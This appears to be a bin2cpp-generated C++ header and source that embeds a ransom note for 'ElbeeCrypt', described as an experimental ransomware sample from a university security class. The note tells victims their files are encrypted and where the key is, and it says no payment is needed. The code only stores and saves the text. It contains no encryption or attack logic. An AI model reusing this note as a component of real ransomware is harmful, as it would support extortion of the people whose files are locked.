/**
 * This file was generated by bin2cpp v3.0.0
 * Copyright (C) 2013-2021 end2endzone.com. All rights reserved.
 * bin2cpp is open source software, see http://github.com/end2endzone/bin2cpp
 * Source code for file 'recover-your-files.txt', last modified 1668718820.
 * Do not modify this file.
 */
#ifndef RECOVER_YOUR_FILES_H
#define RECOVER_YOUR_FILES_H

#include <stddef.h>

namespace bin2cpp
{
  #ifndef BIN2CPP_EMBEDDEDFILE_CLASS
  #define BIN2CPP_EMBEDDEDFILE_CLASS
  class File
  {
  public:
	virtual ~File() = default; //This is here to get rid of a GCC warning. Perhaps add a pull request
    virtual size_t getSize() const = 0;
    /* DEPRECATED */ virtual inline const char * getFilename() const { return getFileName(); }
    virtual const char * getFileName() const = 0;
    virtual const char * getFilePath() const = 0;
    virtual const char * getBuffer() const = 0;
    virtual bool save(const char * filename) const = 0;
  };
  #endif //BIN2CPP_EMBEDDEDFILE_CLASS
  const File & getRecoveryourfilesTxtFile();
}; //bin2cpp

#endif //RECOVER_YOUR_FILES_H
/**
 * This file was generated by bin2cpp v3.0.0
 * Copyright (C) 2013-2021 end2endzone.com. All rights reserved.
 * bin2cpp is open source software, see http://github.com/end2endzone/bin2cpp
 * Source code for file 'recover-your-files.txt', last modified 1668718820.
 * Do not modify this file.
 */
#if defined(_WIN32) && !defined(_CRT_SECURE_NO_WARNINGS)
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <string> //for std::string
#include <iostream>
#include <fstream>  //for ofstream
namespace bin2cpp
{
  class RecoveryourfilesTxtFile : public virtual bin2cpp::File
  {
  public:
    RecoveryourfilesTxtFile() { build(); }
    virtual ~RecoveryourfilesTxtFile() {}
    virtual size_t getSize() const { return 2303; }
    virtual const char * getFileName() const { return "recover-your-files.txt"; }
    virtual const char * getFilePath() const { return getFileName(); }
    virtual const char * getBuffer() const { return mBuffer.c_str(); }
    void build()
    {
      mBuffer.clear();
      mBuffer.reserve(getSize()); //allocate all required memory at once to prevent reallocations
      mBuffer.append("### ELBEECRYPT ###\r\n\r\nIf you are reading this, it means your personal files were locked by ElbeeCrypt, an experimental ransomware sample made as a project for CSULB\'s CECS-378 computer security class.", 200);
      mBuffer.append(" All of your images, videos, music, documents, etc have been securely encrypted using symmetric key cryptography. More information about this run, including the fingerprint of the key used, can be fou", 200);
      mBuffer.append("nd below:\r\n\r\nEncryption scheme: %encryption_scheme%\r\nKeypair type: %keypair_type%\r\nKey fingerprint: %key_fingerprint%\r\nChunk size: %chunk_size% bytes\r\nTargeted extensions: %target_extensions%\r\nRoot di", 200);
      mBuffer.append("rectories: %root_directories%\r\nEncrypted extension: %encrypted_extension%\r\nEncrypted file list location: %encrypted_filelist_location%\r\nTotal files encrypted: %total_encrypted%\r\nSpam ransom note: %spa", 200);
      mBuffer.append("m_ransom_note%\r\nStartup safety net enabled: %safety_net_enabled% (was bypassed if this option is true)\r\n\r\nAlthough you are now a victim of ransomware, you are NOT required to pay any sort of monetary ", 200);
      mBuffer.append("compensation to decrypt your files. ElbeeCrypt has not discarded the unique private key used in the encryption process, and it is available on your desktop. It should be named something similar to \"el", 200);
      mBuffer.append("beecrypt-privkey_<some random str>.elbeecrypt-key\". Additionally, unlike many recently discovered ransomware samples, ElbeeCrypt HAS NOT submitted any of your personal files or otherwise any personall", 200);
      mBuffer.append("y identifiable information (PII) to any sort of web service or 3rd party. This sample should\'ve come with a decryptor tool that will utilize your uniquely generated private key. To use the decryptor, ", 200);
      mBuffer.append("simply open it, and follow the instructions provided. You will need the decryption key as well as your encrypted files, so DO NOT RENAME OR DISCARD ANY ENCRYPTED FILE OR THE PRIVATE KEY. If you discar", 200);
      mBuffer.append("d the private key, then your files are effectively UNRECOVERABLE!\r\n\r\nPlease keep in mind that ElbeeCrypt WILL NEVER ASK YOU FOR PAYMENT TO DECRYPT YOUR FILES! If this is the case, DO NOT PAY. Instead,", 200);
      mBuffer.append(" submit the sample to https://virustotal.com and check https://id-ransomware.malwarehunterteam.com for a possible solution to get your files back. Keep in mind that these services are NOT 100% GUARANT", 200);
      mBuffer.append("EED to render any sort of solution and are NOT AFFILIATED with the university or any of its partners.\r\n", 103);
    }
    virtual bool save(const char * filename) const
    {
      std::ofstream f(filename, std::ios::out | std::ios::binary | std::ios::trunc);
      if (f.fail()) return false;
      size_t fileSize = getSize();
      const char * buffer = getBuffer();
      f.write(buffer, fileSize);
      f.close();
      return true;
    }
  private:
    std::string mBuffer;
  };
  const File & getRecoveryourfilesTxtFile() { static RecoveryourfilesTxtFile _instance; return _instance; }
}; //bin2cpp
